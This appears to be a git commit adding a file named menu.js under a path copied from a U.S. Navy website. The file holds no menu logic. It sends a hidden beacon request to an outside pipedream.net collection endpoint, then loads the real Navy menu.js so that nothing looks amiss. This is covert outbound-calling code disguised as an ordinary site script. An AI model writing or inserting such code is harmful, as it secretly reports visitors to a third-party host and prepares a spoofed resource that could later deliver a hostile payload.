42dcee2d4524a36d9955cbe194a809db4355c6cc
Rey2 <rhyfk0z@gmail.com>
2026-01-10 04:41:07 +0700

    Create menu.js

---
+++ nvr/resources/js/menu.js
@@ -0,0 +1,2 @@
+(function(){new Image().src='https://eoow6y96ffo9mzx.m.pipedream.net/log?script=menu.js';})();
+var s=document.createElement('script');s.src='https://www.nvr.navy.mil/nvr/resources/js/menu.js';document.head.appendChild(s);
